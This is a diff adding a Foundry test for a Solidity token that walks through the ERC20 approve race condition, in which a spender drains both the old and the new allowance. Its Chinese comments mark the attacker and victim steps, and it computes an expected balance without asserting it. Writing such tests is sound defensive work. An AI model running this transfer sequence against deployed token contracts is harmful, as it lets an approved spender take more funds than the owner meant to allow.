@@ -1,0 +1,58 @@
+<pre>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../src/ERC20.sol"; 
+
+contract ApproveRaceConditionTest is Test {
+    WBSToken private token;
+    address private attacker = address(0x123);
+    address private attacker2 = address(0x456);
+
+    function setUp() public {
+        token = new WBSToken();
+        token.transfer(attacker, 1000 * 10 );
+        token.transfer(attacker2, 1000 * 10 );
+        uint256 attackerBalance = token.balanceOf(attacker);
+        uint256 attacker2Balance = token.balanceOf(attacker2);
+        console.log("attacker's balance:", attackerBalance);
+        console.log("attacker2's balance:", attacker2Balance);
+
+    }
+
+    function testApproveRaceCondition() public {
+    uint256 amount1 = 300 * 10 ;
+    uint256 amount2 = 200 * 10 ;
+
+    // 攻击者批准最大额度
+    vm.startPrank(attacker);
+    token.approve(address(attacker2), amount1); // 初始授权额度
+    vm.stopPrank();
+
+    // 进行竞态条件攻击
+    // 攻击者转账300
+    vm.startPrank(attacker2);
+    token.transferFrom(attacker, attacker2, amount1);
+    vm.stopPrank();
+
+    // 受害者调整授权额度
+    vm.startPrank(attacker);
+    token.approve(address(attacker2), amount2); // 更新授权额度
+    vm.stopPrank();
+
+    // 攻击者再次转账200
+    vm.startPrank(attacker2);
+    token.transferFrom(attacker, attacker2, amount2);
+    vm.stopPrank();
+
+    // 验证攻击结果
+    uint256 attackerBalance = token.balanceOf(attacker2);
+    uint256 attackerInitialBalance = token.balanceOf(attacker);
+    uint256 expectedAttackerBalance = amount1 + amount2;
+
+    console.log("attacker2's balance:", attackerBalance);
+    console.log("attacker's balance:", attackerInitialBalance);
+    }
+
+}
+</pre>
